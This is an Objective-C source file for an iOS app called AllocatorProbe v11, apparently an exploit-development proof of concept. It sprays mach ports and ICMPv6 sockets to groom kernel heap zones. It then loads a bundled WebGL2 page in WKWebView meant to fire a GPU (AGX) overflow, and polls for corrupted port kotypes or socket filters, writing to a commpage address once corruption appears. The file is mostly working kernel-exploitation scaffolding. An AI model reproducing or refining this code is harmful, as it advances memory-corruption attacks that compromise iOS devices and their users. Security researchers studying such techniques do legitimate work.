/*
 * AllocatorProbe v11 — Self-Contained: WKWebView AGX Trigger + Mach Port Scanner
 * ================================================================================
 * Eliminates Safari dependency. Single app that:
 *   1. Sprays 5000 mach ports (kalloc.192 = ipc_port zone) + 200 ICMPv6 sockets
 *   2. Runs 50ms NSTimer scanning for kotype anomalies (kotype>100 proven by v9)
 *   3. After 3s: loads agxfire_v11.html in WKWebView → fires AGX WebGL2 overflow
 *   4. Overflow hits mach ports → kotype=0xFFFFFFFF → kotype>100 triggers:
 *      volatile write to COMMPAGE_TARGET (0x0000000FFFFFC330)
 *      → EXC_BAD_ACCESS, FAR=0x0000000FFFFFC330
 *
 * Bundle ID: com.nexus.fengshui3.TMAQ26273N.TMAQ26273N
 * Stack in IPS: scan → scanTick → NSTimer → CFRunLoop → UIApplicationMain
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#define NUM_PORTS        5000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL

static mach_port_t g_ports[NUM_PORTS];
static int         g_port_count = 0;
static int         g_socks[NUM_SOCKETS];
static int         g_sock_count = 0;
static int         g_found = 0;

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%s", buf);
    NSLog(@"[v11] %s", buf);
}

static void trigger_commpage(const char *reason) {
    ev("COMMPAGE_WRITE: %s => 0x%016llx", reason, (unsigned long long)COMMPAGE_TARGET);
    volatile uint64_t *p = (volatile uint64_t *)COMMPAGE_TARGET;
    *p = 0xBEEFDEAD00FACADE;
    __builtin_trap();
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("SPRAY: socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

static void scan(void) {
    /* ICMPv6 canaries (kalloc.168 = in6pcb zone, F-72 proven) */
    for (int i = 0; i < g_sock_count && !g_found; i++) {
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                g_found = 1;
                ev("ICMP_CORRUPTION: sock=%d byte[%d]=0x%02X", i, j, out[j]);
                trigger_commpage("icmp6_filter_corrupted");
                return;
            }
        }
    }
    /* Mach port canaries (kalloc.192 = ipc_port zone, kotype=0xFFFFFFFF proven by v9) */
    for (int i = 0; i < g_port_count && !g_found; i++) {
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr == KERN_SUCCESS && kotype > 100) {
            g_found = 1;
            ev("KOTYPE_ANOMALY: port=%d kotype=%u kobject=0x%016llx", i, kotype, (unsigned long long)kobject);
            trigger_commpage("kotype_overflow_anomaly_FAR_TARGET");
        }
        if (kr == KERN_SUCCESS && kobject == COMMPAGE_TARGET) {
            g_found = 1; trigger_commpage("mach_kobject_COMMPAGE_TARGET");
        }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate, WKScriptMessageHandler>
@property (strong) UIWindow   *window;
@property (strong) WKWebView  *webView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {
    ev("V11_LAUNCH: AllocatorProbe v11 — WKWebView+Scanner");

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    spray();

    [NSTimer scheduledTimerWithTimeInterval:0.05
                                     target:self
                                   selector:@selector(scanTick:)
                                   userInfo:nil repeats:YES];

    /* Fire overflow after 3s — spray fully settled */
    [NSTimer scheduledTimerWithTimeInterval:3.0
                                     target:self
                                   selector:@selector(fireWebGL:)
                                   userInfo:nil repeats:NO];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    if (!g_found) scan();
    if (tick % 200 == 0) ev("ALIVE tick=%d found=%d socks=%d ports=%d",
                             tick, g_found, g_sock_count, g_port_count);
}

- (void)fireWebGL:(NSTimer *)t {
    ev("FIRE: loading agxfire_v11.html in WKWebView");
    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = YES;
    WKPreferences *prefs = [WKPreferences new];
    prefs.javaScriptEnabled = YES;
    cfg.preferences = prefs;
    WKUserContentController *ucc = [WKUserContentController new];
    [ucc addScriptMessageHandler:self name:@"nexus"];
    cfg.userContentController = ucc;

    self.webView = [[WKWebView alloc] initWithFrame:self.window.bounds configuration:cfg];
    [self.window.rootViewController.view addSubview:self.webView];

    NSURL *url = [[NSBundle mainBundle] URLForResource:@"agxfire_v11" withExtension:@"html"];
    if (url) {
        [self.webView loadFileURL:url
          allowingReadAccessToURL:url.URLByDeletingLastPathComponent];
    } else {
        ev("ERROR: agxfire_v11.html missing from bundle");
    }
}

- (void)userContentController:(WKUserContentController *)ucc
      didReceiveScriptMessage:(WKScriptMessage *)msg {
    ev("JS_MSG: %s", [[msg.body description] UTF8String]);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
